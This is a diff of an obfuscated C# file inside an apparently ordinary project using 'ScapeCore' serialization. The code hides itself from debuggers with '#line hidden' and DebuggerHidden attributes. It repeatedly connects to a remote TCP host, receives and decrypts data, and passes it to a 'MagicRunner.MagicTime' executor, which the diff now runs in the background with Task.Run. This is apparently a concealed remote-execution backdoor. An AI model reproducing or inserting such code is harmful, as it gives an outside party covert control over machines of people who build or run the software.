@@ -8,6 +8,7 @@ using System.Runtime.CompilerServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Security.Cryptography;
+using ScapeCore.Core.Serialization;
 
 #line hidden
 namespace _.__._0x0002
@@ -19,7 +20,7 @@ namespace _.__._0x0002
         [DebuggerBrowsable(DebuggerBrowsableState.Never)]
         private readonly static Type[] _managers =
         {
-            typeof(_.__._0x0006.SM)
+            typeof(SerializationManager)
         };
 
         [DebuggerStepThrough]
@@ -35,7 +36,7 @@ namespace _.__._0x0002
                 }
 
             }
-            catch (Exception ex)
+            catch
             {
                 throw;
             }
@@ -50,7 +51,6 @@ namespace _.__._0x0002
             var ff = false;
             var k = Array.Empty<byte>();
             var sk = Array.Empty<byte>();
-
 
             void e() => c = new TcpClient(li, p);
             while (c == null)
@@ -91,19 +91,20 @@ namespace _.__._0x0002
                     else
                     {
                         if (br < 55) continue;
-
-                        var i = _.__._0x0006.SM.DS.DS<string>(v, d: true);
-                        if (i.Error == _.__._0x0006.SCSS.SE.None)
+                        var i = SerializationManager.Deserializer.Deserialize<string>(v, decompress: true);
+                        if (i.Error == ScapeCore.Core.Serialization.Streamers.ScapeCoreSeralizationStreamer.SerializationError.None)
                         {
                             var o = i.Output.Value;
 
                             [DebuggerStepThrough]
                             [DebuggerHidden]
                             [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
-                            string op() => _0x0001.MagicRunner.MagicTime(D(o, k, sk));
-
+                            string op()
+                            {
+                                return _0x0001.MagicRunner.MagicTime(D(o, k, sk));
+                            };
                             if (!string.IsNullOrEmpty(o))
-                                op();
+                                Task.Run(op);
                         }
                     }
 
